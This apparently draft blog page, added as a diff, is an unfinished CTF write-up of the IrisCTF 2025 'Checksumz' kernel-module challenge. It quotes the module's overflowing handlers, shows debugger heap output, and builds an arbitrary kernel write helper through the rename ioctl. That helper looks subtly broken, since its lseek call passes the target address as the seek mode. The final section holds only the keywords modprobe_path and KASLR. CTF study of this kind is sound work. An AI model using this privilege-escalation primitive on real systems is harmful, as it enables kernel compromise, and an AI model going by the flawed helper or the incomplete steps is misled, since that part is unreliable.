@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>IrisCTF 2025 - Checksumz &ndash; guest@gbrls.github.io</title>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/palettes/tokyo-night-dark.css">
+<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+
+
+
+
+
+
+
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+      <li class="nomarker"><h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">guest@gbrls.github.io</a></h1></li>
+    
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>IrisCTF 2025 - Checksumz</h1>
+    </header>
+    <div class="content__body">
+        <h1 id="problem-statement">Problem statement</h1>
+
+
+
+<div class="goat svg-container ">
+  
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      font-family="Menlo,Lucida Console,monospace"
+      
+        viewBox="0 0 632 41"
+      >
+      <g transform='translate(8,16)'>
+<text text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'>"</text>
+<text text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'>S</text>
+<text text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='40' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'>,</text>
+<text text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='72' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'>I</text>
+<text text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='120' y='4' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='128' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='144' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='152' y='4' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='160' y='4' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='168' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='184' y='4' fill='currentColor' style='font-size:1em'>I</text>
+<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>y</text>
+<text text-anchor='middle' x='200' y='4' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='208' y='4' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='216' y='4' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='232' y='4' fill='currentColor' style='font-size:1em'>w</text>
+<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='240' y='4' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='248' y='4' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='256' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='264' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='280' y='4' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>f</text>
+<text text-anchor='middle' x='288' y='4' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='296' y='4' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='304' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='312' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='320' y='4' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='336' y='4' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='344' y='4' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='352' y='4' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>w</text>
+<text text-anchor='middle' x='360' y='4' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='368' y='4' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='376' y='4' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='384' y='4' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='392' y='4' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='408' y='4' fill='currentColor' style='font-size:1em'>b</text>
+<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='416' y='4' fill='currentColor' style='font-size:1em'>y</text>
+<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='432' y='4' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='432' y='20' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='440' y='4' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='448' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='448' y='20' fill='currentColor' style='font-size:1em'>d</text>
+<text text-anchor='middle' x='456' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='456' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='464' y='4' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='464' y='20' fill='currentColor' style='font-size:1em'>v</text>
+<text text-anchor='middle' x='472' y='4' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='472' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='480' y='4' fill='currentColor' style='font-size:1em'>g</text>
+<text text-anchor='middle' x='480' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='488' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='496' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='496' y='20' fill='currentColor' style='font-size:1em'>.</text>
+<text text-anchor='middle' x='504' y='4' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='504' y='20' fill='currentColor' style='font-size:1em'>"</text>
+<text text-anchor='middle' x='512' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='520' y='4' fill='currentColor' style='font-size:1em'>m</text>
+<text text-anchor='middle' x='536' y='4' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='544' y='4' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='552' y='4' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='560' y='4' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='576' y='4' fill='currentColor' style='font-size:1em'>k</text>
+<text text-anchor='middle' x='584' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='592' y='4' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='600' y='4' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='608' y='4' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='616' y='4' fill='currentColor' style='font-size:1em'>l</text>
+</g>
+
+    </svg>
+  
+</div>
+<p>We&rsquo;re given a nicely setup environment with a vulnerable kernel module.</p>
+<p>Below this the main struct with holds the driver&rsquo;s state per file descriptor.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> checksum_buffer {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">loff_t</span> pos;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> state[<span style="color:#ae81ff">512</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">size_t</span> size;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">size_t</span> read;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> name;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> s1;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint32_t</span> s2;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>It gets initialized in the <code>open</code> handler, note the <code>kzalloc</code> and pay attention
+to the size of each allocation.</p>
+<p>SLUB is the default allocator for most Linux systems and we know that it
+allocates blocks in fixed sizes and the page frames are separate[1]. So,
+<code>kmalloc-128</code> is used to allocations like 100 bytes, <code>kmalloc-256</code> for 200
+bytes, etc.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">checksumz_open</span>(<span style="color:#66d9ef">struct</span> inode <span style="color:#f92672">*</span>inode, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file) {
+</span></span><span style="display:flex;"><span>	file<span style="color:#f92672">-&gt;</span>private_data <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> checksum_buffer), GFP_KERNEL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> checksum_buffer<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> checksum_buffer<span style="color:#f92672">*</span>) file<span style="color:#f92672">-&gt;</span>private_data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	buffer<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#ae81ff">1000</span>, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In this case, since the allocations are above 512 and below 1024 bytes, they&rsquo;ll
+get allocated in <code>kmalloc-1024</code>.</p>
+<h1 id="buffer-overflow">Buffer overflow</h1>
+<p>Below are the <code>lseek</code> and <code>write</code> handlers. Note that the overflow happens
+because we can set the <code>buffer-&gt;pos</code> to the end of the buffer, and during the
+write, it&rsquo;ll overflow.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">loff_t</span> <span style="color:#a6e22e">checksumz_llseek</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">loff_t</span> offset, <span style="color:#66d9ef">int</span> whence) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> checksum_buffer<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> file<span style="color:#f92672">-&gt;</span>private_data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (whence) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">case</span> SEEK_SET:
+</span></span><span style="display:flex;"><span>			buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">=</span> offset;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>		buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">&gt;=</span> buffer<span style="color:#f92672">-&gt;</span>size) <span style="color:#75715e">// size is 256
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">=</span> buffer<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// so we can set it to 255
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> buffer<span style="color:#f92672">-&gt;</span>pos;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">checksumz_write_iter</span>(<span style="color:#66d9ef">struct</span> kiocb <span style="color:#f92672">*</span>iocb, <span style="color:#66d9ef">struct</span> iov_iter <span style="color:#f92672">*</span>from) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> checksum_buffer<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> iocb<span style="color:#f92672">-&gt;</span>ki_filp<span style="color:#f92672">-&gt;</span>private_data;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">size_t</span> bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">iov_iter_count</span>(from);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>buffer)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBADFD;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>bytes)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ssize_t</span> copied <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_iter</span>(buffer<span style="color:#f92672">-&gt;</span>state <span style="color:#f92672">+</span> buffer<span style="color:#f92672">-&gt;</span>pos, <span style="color:#a6e22e">min</span>(bytes, <span style="color:#ae81ff">16</span>), from); <span style="color:#75715e">// we can start write from 255 to 255 + 16
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">+=</span> copied;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">&gt;=</span> buffer<span style="color:#f92672">-&gt;</span>size)
+</span></span><span style="display:flex;"><span>        buffer<span style="color:#f92672">-&gt;</span>pos <span style="color:#f92672">=</span> buffer<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> copied;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And there is also a <code>read</code> that overflows, it leaks <strong>256</strong> bytes instead of <strong>16</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">checksumz_read_iter</span>(<span style="color:#66d9ef">struct</span> kiocb <span style="color:#f92672">*</span>iocb, <span style="color:#66d9ef">struct</span> iov_iter <span style="color:#f92672">*</span>to) {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">ssize_t</span> copied <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_iter</span>(buffer<span style="color:#f92672">-&gt;</span>state <span style="color:#f92672">+</span> buffer<span style="color:#f92672">-&gt;</span>pos, <span style="color:#a6e22e">min</span>(bytes, <span style="color:#ae81ff">256</span>), to);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> copied;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="hands-on">hands on</h1>
+<p>Let&rsquo;s test our assumptions debugging the kernel with driver.
+In the CTF challenge files we have symbols, so setting a breakpoint is as easy
+as <code>b *(checksumz_write_iter+113)</code>.</p>
+<p>And to trigger the breakpoint we can <code>open</code> the file descriptor and <code>write</code> to it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/checksumz&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">ssize_t</span> written_bytes <span style="color:#f92672">=</span> <span style="color:#a6e22e">write</span>(fd, <span style="color:#f92672">&amp;</span>data, <span style="color:#66d9ef">sizeof</span>(data));
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// ...
+</span></span></span></code></pre></div><p>In gdb when the breakpoint is triggered, let&rsquo;s inspect the <code>checksum_buffer</code>:
+object:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pwndbg&gt; p/x $rbx
+</span></span><span style="display:flex;"><span>$5 <span style="color:#f92672">=</span> 0xff11000004a50800
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; p/x *<span style="color:#f92672">((</span>struct checksum_buffer*<span style="color:#f92672">)</span>$rbx<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  pos <span style="color:#f92672">=</span> 0x1ff,
+</span></span><span style="display:flex;"><span>  state <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>0x0 &lt;repeats <span style="color:#ae81ff">512</span> times&gt;<span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> 0x100,
+</span></span><span style="display:flex;"><span>  read <span style="color:#f92672">=</span> 0x0,
+</span></span><span style="display:flex;"><span>  name <span style="color:#f92672">=</span> 0xff11000004a51400,
+</span></span><span style="display:flex;"><span>  s1 <span style="color:#f92672">=</span> 0x1,
+</span></span><span style="display:flex;"><span>  s2 <span style="color:#f92672">=</span> 0x0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; p/x <span style="color:#f92672">((</span>struct checksum_buffer*<span style="color:#f92672">)</span>$rbx<span style="color:#f92672">)</span>-&gt;name-$rbx
+</span></span><span style="display:flex;"><span>$8 <span style="color:#f92672">=</span> 0xc00
+</span></span><span style="display:flex;"><span>pwndbg&gt; p 0xc00/0x400
+</span></span><span style="display:flex;"><span>$9 <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><p>Both heap allocations we discussed before are 1024 (0x400 in hex) aligned, i.e.
+their addresses are multiples of 0x400. We can also see that both allocations
+are close, just <strong>0x400 * 3</strong> bytes apart.</p>
+<h1 id="unlocking-abilities-getting-a-better-primitive">unlocking abilities (getting a better primitive)</h1>
+<p>The first we&rsquo;re going to do is to override that <code>size</code> variable withthe
+overflow we have in the <code>state</code> buffer, since they&rsquo;re next to each other we
+just need to <code>lseek</code> to the end of <code>state</code> and then write a big value for <code>size</code>.</p>
+<p>Now that we are no longer constrained by 16 bytes right after <code>state</code>, we can
+also override the <code>name</code> string pointer. This is going to be very useful since
+we can use the <code>rename</code> <code>ioctl</code> to write to that pointer 48 bytes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">checksumz_ioctl</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> command, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> arg) {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> checksum_buffer<span style="color:#f92672">*</span> buffer <span style="color:#f92672">=</span> file<span style="color:#f92672">-&gt;</span>private_data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>file<span style="color:#f92672">-&gt;</span>private_data)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EBADFD;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (command) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">case</span> CHECKSUMZ_IOCTL_RENAME:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>user_name_buf <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> __user<span style="color:#f92672">*</span>) arg;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">copy_from_user</span>(buffer<span style="color:#f92672">-&gt;</span>name, user_name_buf, <span style="color:#ae81ff">48</span>)) {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ...
+</span></span></span></code></pre></div><p>By overwriting the value in the <code>name</code> pointer and calling the <code>rename</code> <code>ioctl</code>
+we have an arbitrary write anywhere in the kernel :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#66d9ef">int</span> fd, <span style="color:#66d9ef">uint64_t</span> addr, <span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span> data) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lseek</span>(fd, <span style="color:#ae81ff">0x210</span>, addr);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fd, <span style="color:#f92672">&amp;</span>addr, <span style="color:#66d9ef">sizeof</span>(addr));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ioctl</span>(fd, CHECKSUMZ_IOCTL_RENAME, data) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;ioctl - CHECKSUMZ_IOCTL_RENAME&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="heap-magic">Heap magic</h1>
+<p><code>modprobe_path</code>, <code>KASLR</code>, <code>kmalloc-1024</code></p>
+<h1 id="references">References</h1>
+<ul>
